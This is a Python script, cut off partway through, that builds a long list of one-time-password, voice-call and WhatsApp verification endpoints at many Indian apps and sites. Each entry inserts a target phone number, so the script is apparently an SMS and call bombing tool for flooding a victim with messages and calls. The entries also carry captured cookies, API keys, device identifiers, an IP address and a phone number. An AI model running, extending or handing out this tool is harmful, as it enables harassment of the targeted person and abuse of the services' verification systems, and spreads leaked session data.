import requests
import time
import json
from requests.structures import CaseInsensitiveDict

def smsgi(number):
    number = str(number)
  #  while time.time() - start_time < 36000:
    
    # List of APIs with their corresponding URLs, headers, and payloads
    apis = [
        
        {
            "url": "https://vyaparapp.in/resend/otp",
            "params": {"email": number, "country_code": "91"},
            "method": "GET"
        },
        {
            "url": "https://securedapi.confirmtkt.com/api/platform/registerOutput",
            "params": {"mobileNumber": number},
            "method": "GET"
        },
        {
            "url": "https://students.byjus.com/mobiles/request_otp",
            "params": {"mobile": "+91-" + number},
            "method": "GET"
        },
        {
            "url": f"https://www.healthkart.com/veronica/user/validate/voice/1/{number}/signup",
            "params": {"plt": "2", "st": "1"},
            "method": "GET"
        },
        
        {
            "url": "https://mobile-api-v5.nearbuy.com/v5/otp/resend?osId=776adbc43e26e1b3&width=1080&height=2260&density=2.75&andOsVersion=13&userId=10042661915",
            "data": {"deliveryMode": "CALL", "phoneNumber": number},
            "headers": {
                'appversion': 'and_216',
                'networkstatus': 'WIFI',
                'content-type': 'application/json; charset=UTF-8',
                'user-agent': 'okhttp/4.8.0'
            },
            "method": "POST"
        },
        {
            "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
            "data": {"mobile": number},
            "headers": {
                "Host": "profile.swiggy.com",
                "tracestate": "@nr=0-2-737486-14933469-25139d3d045e42ba----1692101455751",
                "traceparent": "00-9d2eef48a5b94caea992b7a54c3449d6-25139d3d045e42ba-00",
                "newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiNzM3NDg2IiwiYXAiOiIxNDkzMzQ2OSIsInRyIjoiOWQyZWVmNDhhNWI9ZDYiLCJpZCI6IjI1MTM9ZDNkMDQ1ZTQyYmEiLCJ0aSI6MTY5MjEwMTQ1NTc1MX19",
                "pl-version": "55",
                "user-agent": "Swiggy-Android",
                "tid": "e5fe04cb-a273-47f8-9d18-9abd33c7f7f6",
                "sid": "8rt48da5-f9d8-4cb8-9e01-8a3b18e01f1c",
                "version-code": "1161",
                "app-version": "4.38.1",
                "latitude": "0.0",
                "longitude": "0.0",
                "os-version": "13",
                "accessibility_enabled": "false",
                "swuid": "4c27ae3a76b146f3",
                "deviceid": "4c27ae3a76b146f3",
                "x-network-quality": "GOOD",
                "accept-encoding": "gzip",
                "accept": "application/json; charset=utf-8",
                "content-type": "application/json; charset=utf-8",
                "content-length": "..."
            },
            "method": "POST"
        },
        {
            "url": "http://vivagamatrimony.com/vivaga/Front_End/reg_otp/",
            "data": {
                'profile_for': 'Myself',
                'full_name': 'Shivam L',
                'country_code': '91',
                'mobile': number
            },
            "headers": {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept': '*/*',
                'X-Requested-With': 'XMLHttpRequest',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
                'Origin': 'http://vivagamatrimony.com',
                'Referer': 'http://vivagamatrimony.com/vivaga/',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8',
                'Cookie': 'ci_session=8osj55oobskupns6t3ig4srsvqt98u1j; twk_idm_key=rGLo73z0Fy78M2kL-mTnQ; twk_uuid_5fe070a2df060f156a8ef26e=%7B%22uuid%22%3A%221.2U5zhFriE9wx6UCbKmitfSmNNLgB3ZCn3TIk7H6RYkla3MhsoXUMyRTQOL5f9bfgSYR6sPMmVN4R82QVC1WCZiWWZEIYJCk5Wx11AjN4Rfg79oXYuzjSifgsdLKJheY%22%2C%22version%22%3A3%2C%22domain%22%3A%22vivagamatrimony.com%22%2C%22ts%22%3A1702928360465%7D; TawkConnectionTime=1702928375278'
            },
            "method": "POST"
        },
        {
            "url": "https://www.adda52.org.in/api/v1/offers/user/sendOtp",
            "data": {
                'user': number,
                'clientName': 'web',
                'domainKey': 'Adda52.org.in',
                'source': 'landing_page'
            },
            "headers": {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept': '*/*',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://www.adda52.org.in',
                'Referer': 'https://www.adda52.org.in/signup-widget/?cpn=%7BcampaignName%7D&cid=EAIaIQobChMIyJrk6eKdgwMVGVdIAB1OEgg-EAAYASAAEgLvmPD_BwE&pl=&kw=pokerbaazi&adg=%7BadgroupName%7D&utm_source=Search-Poker-Competitor&utm_medium=ggl_cpc&utm_matchtype=p&utm_device=m&utm_campaign=Pmax&utm_content=156015778479&utm_keyword=pokerbaazi&utm_creative=684580700775&utm_placement=&utm_adposition=&gad_source=1&gclid=EAIaIQobChMIyJrk6eKdgwMVGVdIAB1OEgg-EAAYASAAEgLvmPD_BwE&url1=/1000-bonus-offer2&url2=/1000-bonus-offer2'
            },
            "method": "POST"
        },
        {
            "url": "https://prod.milkbasket.com/milkbasket_prod_current/consumer/user/register_mobile",
            "headers": {
                "Accept-Charset": "UTF-8",
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A105F Build/RP1A.200720.012)",
                "Host": "prod.milkbasket.com",
                "Connection": "Keep-Alive",
                "Content-Length": "94"
            },
            "data": {
                "retry": True,
                "mobile": number,
                "retryType": "voice",
                "loaderMessage": "Initializing call.."
            },
            "method": "POST"
        },
        {
            "url": "https://prod.milkbasket.com/milkbasket_prod_current/consumer/user/register_mobile",
            "headers": {
                "Accept-Charset": "UTF-8",
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A105F Build/RP1A.200720.012)",
                "Host": "prod.milkbasket.com",
                "Connection": "Keep-Alive",
                "Content-Length": "48"
            },
            "data": {
                "mobile": number,
                "appHash": "tG3K6W/hoYi"
            },
            "method": "POST"
        },
        {
            "url": f"https://www.healthkart.com/veronica/user/validate/voice/1/{number}/signup?plt=2&st=1",
            "headers": {
                "sec-ch-ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Brave\";v=\"114\"",
                "sec-ch-ua-mobile": "?1",
                "user-agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
                "st": "1",
                "plt": "2",
                "accept": "application/json, text/plain, */*",
                "device": "ba2a15558802b00",
                "pincode": "false",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-gpc": "1",
                "accept-language": "en-US,en;q=0.7",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.healthkart.com/",
                "accept-encoding": "gzip, deflate, br",
                "cookie": "adb=0; ufi=1; cf_clearance=6NwtHmrzLrHfHDe9UZgqjBzTw20eDLZJIRV6A0YTb88-1695612025-0-1-c3ce1f1.d62b60e6.5b3dbe11-0.2.1695612025"
            },
            "method": "GET"
        },
        {
            "url": "https://api.doubtnut.com/v4/student/login",
            "headers": {
                "Host": "api.doubtnut.com",
                "version_code": "1111",
                "has_upi": "true",
                "device_model": "Redmi Note 7 Pro",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.2"
            },
            "data": {
                "app_version": "7.10.2",
                "aaid": "a4c4e462-2744-4c94-85ea-db8b47f75d00",
                "course": "",
                "phone_number": number,
                "language": "en",
                "udid": "0ae3a1bee1561e32",
                "class": "",
                "gcm_reg_id": "f38jugJKSEKBOkcASRbSiJ:APA91bElvA0mtSl4LIYxxH60qQJP_U8bU9ew16vhiiQRdSzVFpJOBtr9ooY4hbOd2NmALUDt5sERZsO0NLRob3zf2MoCoaqciF2XibBo22VPxYIFqDULptYTVrEcgZCQ_qpXAfYKD-iR"
            },
            "method": "POST"
        },
        {
            "url": "https://micro.doubtnut.com/otp/send-call",
            "headers": {
                "Host": "micro.doubtnut.com",
                "version_code": "1111",
                "has_upi": "true",
                "device_model": "Redmi Note 7 Pro",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/5.0.0-alpha.2"
            },
            "data": {
                "phone": number,
                "locale": "en"
            },
            "method": "PUT"
        },
        {
            "url": "https://api.cureskin.com/api/parse/functions/requestOTP",
            "headers": {
                "Host": "api.cureskin.com",
                "Content-Length": "299",
                "Baggage": "sentry-environment=production,sentry-release=app%402.0.428-0,sentry-public_key=fb75233753ac48cc93a56596bcdc8525,sentry-trace_id=1f108bfb18da4ae99681d51a0c08419c",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36",
                "Sentry-Trace": "1f108bfb18da4ae99681d51a0c08419c-a22bb520894a1948-0",
                "Content-Type": "text/plain",
                "Accept": "*/*",
                "Origin": "https://app.cureskin.com",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://app.cureskin.com/",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8"
            },
            "data": {
                "mobileNumber": number,
                "deviceId": "f338792bf49fb2e48229",
                "source": "web",
                "time": "2023-09-24T08:22:25.811Z",
                "digest": "d7ec0ba46dc9eff36f048bb46592294c858070ad31fa770f4e1e1dea82cf6a93",
                "_ApplicationId": "myAppId",
                "_ClientVersion": "js3.4.4",
                "_InstallationId": "4d53e2d5-2108-42ed-92da-ac252e7f87ce"
            },
            "method": "POST"
        },
        {
            "url": "https://api.cureskin.com/api/parse/functions/retryOTP",
            "headers": {
                "Host": "api.cureskin.com",
                "Content-Length": "284",
                "Baggage": "sentry-environment=production,sentry-release=app%402.0.428-0,sentry-public_key=fb75233753ac48cc93a56596bcdc8525,sentry-trace_id=46eaa3e5f35a480abd0a25517080c82f",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36",
                "Sentry-Trace": "46eaa3e5f35a480abd0a25517080c82f-aeaeed3f7740c180-0",
                "Content-Type": "text/plain",
                "Accept": "*/*",
                "Origin": "https://app.cureskin.com",
                "X-Requested-With": "pure.lite.browser",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://app.cureskin.com/",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8"
            },
            "data": {
                "mobileNumber": number,
                "deviceId": "f338792bf49fb2e48229",
                "time": "2023-09-24T08:22:57.160Z",
                "digest": "ab994830a6bca8ad49be89e14592d06deee04c42d63d6f4a6263b1b244e2d2f7",
                "_ApplicationId": "myAppId",
                "_ClientVersion": "js3.4.4",
                "_InstallationId": "4d53e2d5-2108-42ed-92da-ac252e7f87ce"
            },
            "method": "POST"
        },
        {
            "url": "https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Linux; Android 11; SM-A105F Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.0 Mobile Safari/537.36"
            },
            "data": {
                "contactNumber": number,
                "domainId": "2"
            },
            "method": "POST"
        },
        {
            "method": "POST",
            "url": "https://www.abhibus.com/sendOtp",
            "data": {
                'mobile': number,
                'prd': 'mobile',
                'userToken': '03AFcWeA62MtH8YBpjTgPyBhVrIpuHGgFwBPs2Z1fXz93x1zikMCwCkQpkF3XKDj6DVoBo9k_pmre1d6jf7K5MEBnP1zIVVExu2k6FLjFeNs9ifNF27baZoDtci70WNWp4fm9tkfNEJI-96l0ornXSkYsZVXBgjy022-F0x1-X6JRt969GN2O6H8YZyYGUejwNTQ4X9lIy4KvkbG_zHxyUKyK2xSMmHVYIvA3BSeD7rXnihD3A4ukeYYZGEmOWLSmiaGalu5CyWDabEvkUCgvExUP_L2d4Pe8wwOrTDisp9UqzDUSx_lJghg7peLQE9sUFekju_J08eetDIkM5Ol7X-G8pUFLjL--sphbGDKvQAQhDrdARge3HxAFVsdzWTEX8LGCTNAVdBUxx7DMx5VGQPDDSzPFJJnHFD_ba3SxcGEnGGGoXpQjLBbeVkEa9FIUyaNegU_ZnCYzpm06OH3g61Wvw-Wo-a_4uVS4LcYijmpEktS2h6zQADg-zFljOCHIZQ09mFgahjmm5593bV_VvgqM1jTPq4j6EJNQcQg0EP3Ppg1ucPgoxCazgzK7_nMXgd_fQwqNznetjyMrSnpZwLud-4BeVF2P3NoL8gF6Xmwdjc19Yzdb2ZBpnGY4XRylnCtDI99uprHY6x0A1S_VHs1ZKUUBfgtgd38riY-_IVGhgXEhrCzFneSmKWyBYW7vCCJHFDHHC_p2-rNpDVWvqTdF2wxgjK3R6lJIEbocuoq5x6xOayAHDypIYlx0UlmKmVPi-aIQJ8aGuuh4eyyBfX_7CgKxx1PobvJ_Wcdm4-gYx_johZrPAAvW1pdUhdhdXXQ4_8sKuXk8ukzfqT8YcH0fs36ZEjgSIsAykRo_AhNkS2_jyfZLZYkN6ywEbwcsarVtfXYYwaBGqdS7Zo1E-qUjy1G47bfSas1psmQffJbZfooBxKy9dEIvKAtl08YqgBijfEYsGpiAkUHPDt9m8dZRsD7dhR-t-r14IeWg8r1WIM1yxTWhBlDPYtkcE4X4rUkGP_Y-0qVVyXUZL03Wf06s9JiP0o_6BvLcWjCvkza924Y7u3D1DA-cyPC-07xBESMuWy9Oqn9QGYB2LabY-635kRKhjszR2omZupjZoms5EmFDskOi7Tbaz_99MwlUXxGylMHhcVyp1ROeVW5gx5Y6h0U9uGmHqYpFZ4rmx-Nxz-AxdLl9yrYowuYGQTFeA_GT9ZqN1QvuXtlkYNsASOTb4CNwKS0V1wzB1rSOs6KBj1A4tk8ygiwTrRHU31VkmkIbkT5TalyB_M-ZCKDbQBLHD58nSI8BorHOdiO2MLgdKb5ejPLSbUzc9a2pP0R7EufIGEj4V8wW4dQWD8O00T9kDMN6ECC-t9iKYux_7xMd0v_cTkglcC1GQrkMJ5XNY8UL7a0GznQb1woI40UpM2PTzZYraTz9DUmADlkelQ0OShpqgTY1XTD9DuiGAynM7JsU3poWhsk3QkQcuhNqqV4Osrd1GX84WQTjzkN2tGq0TSQVaAsd8nZHq8a2apwkTYoS_QTgu8pc91pg3GAhHuQCHmxnMs2DFmJOH6MH54TLBOZtaRgi6HMwYcZG3yOuHvWqnlhitTpinslIn_4xZ7J9p0aZXtMcI_RQOvfaaXX04dUMIFUdKtzsLJrL35ugI77TOp_BNxmxZVtkD3KXEXT7ToueNyjxePARAi3JfPQ5SLMiwWlBUWfbQwJENyiuJ_11TukY3lBm-4lQic76LudRUxA_aVvtrwAXVOg8zmfzufk8jpUIeLd6wYpST9jLwpm_RhWckzJn-WFBTHBnimzmzP592naP4-w3sqklHDgOBQ6hKgxjqDAApgYrCfZ87MQFprHwcp5r1',
                'version': '10'
            }
        },
        {
            "method": "POST",
            "url": 'https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/generateOtp',
            "data": {
                'sourceName': 'Google_Search',
                'mobileNumber': number,
                'deviceOS': 'Web',
                'applSource': 'PL',
                'deviceType': 'Web',
                'deviceSubType': ''
            },
            "headers": {
                'Content-Type': 'application/json',
                'Origin': 'https://www.tatacapital.com',
                'Referer': 'https://www.tatacapital.com/'
            }
        },
        {
            "method": "POST",
            "url": 'https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice',
            "data": {
                'phone': number,
                'isOtpViaCallAtLogin': 'true',
                'applSource': ''
            },
            "headers": {
                'Content-Type': 'application/json',
                'Origin': 'https://www.tatacapital.com',
                'Referer': 'https://www.tatacapital.com/'
            }
        },
       
        {
            "method": "POST",
            "url": "https://api.olx.in/v2/auth/authenticate",
            "data": {
                "grantType": "retry",
                "method": "call",
                "phone": "+91" + number
            },
            "headers": {
                "X-acf-sensor-data": "2,a,TMpKRTdoxJtA/bMtiQzskHx92U6siCaYWjBkNZaMsStuWWZ8O8m6MzoKfX2vfY1xHLr/yo3Gqb3Vyw7O39A0je0OuB/iUnEP/aai7Yu2g6XMOz8xlVpX8eB9l+dURtyhEypM+M/xqVEAXdyalyPrduvFtnx0TCyuwW6tau2maDo=,BHMkuAHLVGza6cgDuEpwN3QKPTKW0J+/J2TLj3blpjuyO2/GWlcYTZ44H7+LkSFzHOcUQibNhCZtqbTXTyo+4d6273WfIbB3vkcukA+1ZwN5WPbPJdx6FLRlhNclsMNT9lBjM6POZNnL67jknhAXDyoW+S9g/G6X0G/S4b5fWt4=\$c1f0jtr7Zs8nbUt4eHfw69RdeiqQJ+NdjDegCxj44oKDW/ki2UnT8vXzSLfAA+0HCYmhE1ESUyb8yywzdvmiXKhD82hIydxgQpVLtK9ctAHV5ASNLotwuqhi0gfPEZAgzeB9J+0XMhZ2mk+3A3jVaPdU0ya9eOlNXqy+V7zq0x1p6keahAFF2wgyqpq2775oq+OsP6OojhZI22tm0ZcsD7ElJ60GvKf1hDxtxxv8xugjeNG7CazWqHDpTL7Fb5BA/emn/lalI+JvhMaRc65RGNvfolQ2nVugn5dtJkG/BkwSayn/1Gtke4lHr9CqqOnb5gNhXDZ96hIGJtw8B+0HznBNetWq06xuAFSnjzd+vx/wc53NrHRPikfWhNeeJumE2U9WFuWZOHdb4hBvxQuOxDUNhiIP79n1qfVfszDhZ5Ezn7WFIO7Pl5KD6OHvDfCUzZeJ/g4vGUdrjDvq247LANeV/CqsqSVASZzP26BnANtgFF6kQAgATvvXwCcBYDpEIOeM0s27vMiDOemQiDqOpMYmdhAEjL2Vbvy6w3WY5X0roTcOFiXBqn8VsVEHiHHDEszzDxbNV2ueDV5Du7nRfTLt9ZF9LzJzy0sd9639DgmYm4r2CyYw9rIrQZHZhZ5G/DJml9r8XghR2ZulvClJfwhf1T/Xe8fNozCN9+Bm2+jOpWDfR9HZafMiWyuEGtyaekFRA2bgRVt25Q5vtRMgwQqoAmXHJ/YY8SWLFLY2NfFBkVCAjEuW5+Z6lISBL4KgyIrcz9FA/K4hzWz7sChPr2Wz6cwe6f6y50RanzhQRVn7Sac5MnJ0EbqArp+GqzleKCg1kZfNtVnB0HQqTLs29P+hA2DHct3KxFl0kEtL91w+81Y06s759oFINDics0ik1YL5Ghm0M+sdzmuvd7BVTm16Dpwg27/Dnf+BCs7+zGz2DXD4q3mNZ0U+neXYgGinKIRiUkf6ATs/RKsz41TVvQE1lTiZ4L9Sdqqyuu05/YRZrXNlx/uOkWEemsiM2B6Xq/OZC27b1aLbz4q4QIKzpjzN7fY9brMalcu5MVzm4GU=$1000,0,0$$",
                "X-Panamera-fingerprint": "807da1a35e55235e",
                "User-Agent": "android 17.08.011 olxin",
                "x-origin-panamera": "Production",
                "laquesis": "pan-41767@b#pan-48465@b#pan-52057@b#pan-53615@b#pan-55363@b#pan-55982@b#pan-59448@b#pan-62267@a#pan-68253@a#road-43386@b#road-47263@a#road-74127@b",
                "laquesisff": "rate_us#resend_code_call_me#listers_verification#legion_login#show_advertisement#default_near_me#notification_pref#edit_location#legion_migrate_v2#pan-27935#pan-36788#pan-38000#pan-42665#pan-43831#pan-41327#pan-42666#pan-45244#pan-48529#pan-48912#pan-50288#pan-50705#pan-57022#road-123",
                "Content-Type": "application/json; charset=UTF-8",
                "Host": "api.olx.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
        },
        {
            "method": "POST",
            "url": 'https://api.wakefit.co/api/consumer-sms-otp/',
            "data": {
                "mobile": number,
                "whatsapp_opt_in": 1
            },
            "headers": {
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
                "api-secret-key": "ycq55IbIjkLb",
                "api-token": "c84d563b77441d784dce71323f69eb42"
            }
        },
       
        {
            "method": "POST",
            "url": "https://customerapp-gateway.porter.in/onboarding/customer/resend_otp/whatsapp",
            "headers": {
                "Host": "customerapp-gateway.porter.in",
                "country": "in",
                "preferred-languages": "{\"app_language\":\"en\"}",
                "brand": "porter",
                "source": "android",
                "version-name": "5.69.2",
                "custom-app-version-code": "242",
                "client-request-uuid": "14ded413-164b-411e-99eb-7ff33ae4ad49",
                "installation-id": "0fe7940e-b9df-46d0-83bf-a59b7645b79b",
                "app-session-id": "3b06ceaf-726c-4bd9-97de-01d5e45c74ab",
                "accept-charset": "UTF-8",
                "accept": "*/*",
                "user-agent": "Ktor client",
                "content-type": "application/json",
                "accept-encoding": "gzip"
            },
            "data": {
                "mobile": number
            }
        },
        {
            "method": "POST",
            "url": "https://homefinance.adityabirlacapital.com/api/sitecore/FLForms/GetOTPForCampaign",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept": "*/*",
                "X-Requested-With": "XMLHttpRequest",
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36",
                "Origin": "https://homefinance.adityabirlacapital.com",
                "Referer": "https://homefinance.adityabirlacapital.com/apply-now"
            },
            "data": {
                "mobileNumber": number,
                "otp": ""  # You may need to provide the actual OTP value here
            }
        },
        {
            "method": "POST",
            "url": 'https://cst.brevistay.com/app-api/login',
            "headers": {
                'Host': 'cst.brevistay.com',
                'brevi-channel': 'ANDROID',
                'brevi-channel-version': '5.4.1',
                'Content-Type': 'application/json; charset=UTF-8',
                'Accept-Encoding': 'gzip',
                'User-Agent': 'okhttp/4.9.1',
            },
            "data": {
                "is_otp": 1,
                "is_password": 0,
                "mobile": number,
                "otp": 123456,  # You may adjust this value as needed
                "password": ""
            }
        },
        {
            "url": 'https://prod.api.cosmofeed.com/api/user/authenticate',
            "method": "POST",
            "data": {
                'phoneNumber': number,
                'countryCode': '+91',
            },
            "headers": {
                'Host': 'prod.api.cosmofeed.com',
                'Accept': 'application/json, text/plain, */*',
                'Cosmofeed-Request-ID': 'e6491e02-b028-44d2-baba-d19ee35590d0',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36',
                'Content-Type': 'application/json',
                'Origin': 'https://cosmofeed.com',
                'X-Requested-With': 'pure.lite.browser',
                'Sec-Fetch-Site': 'same-site',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://cosmofeed.com/',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8',
            }
        },
        {
            "url": f"https://dlv-api.delhivery.com/client-profile/otp/generate/+91{number}",
            "method": "GET",
            "headers": {
                'Host': 'dlv-api.delhivery.com',
                'Accept': 'application/json, text/plain, */*',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
                'Origin': 'https://www.delhivery.com',
                'X-Requested-With': 'pure.lite.browser',
                'Sec-Fetch-Site': 'same-site',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://www.delhivery.com/',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8',
            }
        },
        {
            "url": 'https://www.dhobilite.com/get-one-time-pwd',
            "method": "POST",
            "data": {'phone': number},
            "headers": {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'user-agent': 'Mozilla/5.0 (Linux; Android 11; SM-A105F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'x-requested-with': 'com.dhobilite',
                'sec-fetch-site': 'cross-site',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'accept-encoding': 'gzip, deflate',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            }
        },
        
        {
            "url": "https://entri.app/api/v3/users/check-phone/",
            "method": "POST",
            "data": {'phone': '+91' + number},
            "headers": {
                'Host': 'entri.app',
                'Accept': 'application/json, text/plain, */*',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
                'Client': 'web',
                'User-Language': 'hi',
                'Content-Type': 'application/json',
                'Origin': 'https://webapp.entri.app',
                'X-Requested-With': 'pure.lite.browser',
                'Sec-Fetch-Site': 'same-site',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://webapp.entri.app/',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8',
            }
        },
        {
            "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
            "method": "POST",
            "data": {'mobile_number': number},
            "headers": {
                'Host': 'hyuga-auth-service.pratech.live',
                'Accept': 'application/json, text/plain, */*',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
                'Content-Type': 'application/json',
                'Origin': 'https://hyugalife.com',
                'X-Requested-With': 'pure.lite.browser',
                'Sec-Fetch-Site': 'cross-site',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://hyugalife.com/',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8',
            }
        },
        {
            "url": 'https://m.indiamart.com/ajaxrequest/identified/common/otpVerification',
            "method": "POST",
            "data": {
                'user': number,
                'screenName': 'IMOB EDIT PROFILE',
                'type': 'OTPGEN',
                'authCode': '',
                'glusr_id': '190634360',
                'ciso': 'IN',
                'email': '',
                'user_mobile_country_code': '91',
                'user_country': 'India',
                'userIp': '132.154.59.32',
                'OTPResend': 1,
                'emailVerify': '',
                'source': '',
                'msg_key': 0,
                'attribute_id': '',
                'verifyUser': False,
                'glid': '190634360',
            },
            "headers": {
                'Host': 'm.indiamart.com',
                'Content-Length': '321',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
                'Content-Type': 'application/json',
                'Accept': '*/*',
                'Origin': 'https://m.indiamart.com',
                'X-Requested-With': 'pure.lite.browser',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://m.indiamart.com/my/profile/',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-IN,en-US;q=0.9,en;q=0.8',
                'Cookie': '_gcl_au=1.1.1714626412.1702938507; _gid=GA1.2.1681438095.1702938507; _ym_uid=1702938507765800219; _ym_d=1702938507; _ym_isad=2; _ym_visorc=b; ImeshVisitor=fn%3D%7Cln%3D%7Cem%3D%7Cphcc%3D91%7Ciso%3DIN%7Cmb1%3D9336734442%7Cpct%3D0%7Cctid%3D%7Cglid%3D190634360%7Ccd%3D19%2FDEC%2F2023%7Ccmid%3D%7Cutyp%3DN%7Cev%3D%7Cuv%3D%7Custs%3D%7Cadmln%3D0%7Cadmsales%3D0%7Cpwl%3D0%7C; _ga=GA1.2.1079041600.1702938507; random=0=9|1=7|2=1|3=5|4=4|5=8|6=10|7=6; _clck=poqaf0%7C2%7Cfhn%7C0%7C1447; lang=0; gstate=state%3DNational%20Capital%20Territory%20of%20Delhi; iploc=gcniso%3DIN%7Cgcnnm%3DIndia%7Cgctnm%3DDelhi%7Cgctid%3D69514%7Cgacrcy%3D200%7Cgip%3D132.154.59.32%7Cgstate%3DNational%20Capital%20Territory%20of%20Delhi; __gads=ID=d1a7db4c9f93b15a:T=1702938531:RT=1702938531:S=ALNI_MbaFEWfzH9BpL6TagBih6jItTTLIA; __gpi=UID=00000cb4cc592000:T=1702938531:RT=1702938531:S=ALNI_MaKKdEiWkB0--dFLk4XDeuecG-nUg; _clsk=14cce1o%7C1702938542352%7C2%7C0%7Ce.clarity.ms%2Fcollect; _ga_8B5NXMMZN3=GS1.1.1702938507.1.1.1702938562.5.0.0'
            }
        },
        {
            "url": 'https://induseasywheels.indusind.com/vsms/otp/send/',
            "method": "POST",
            "data": {'mobile': number, 'resend': '0'},
            "headers": {
                'Host': 'induseasywheels.indusind.com',
                'Content-Length': '26',
                'X-NewRelic-ID': 'VwcOWVNQDhAJUlZQDwkOX1Y=',
                'Tracestate': '1322840@nr=0-1-3198536-969269929-f239d601af452b80----1702932089884',
                'Traceparent': '00-18fb34388edaaa805a6470c6525430f0-f239d601af452b80-01',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A235F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
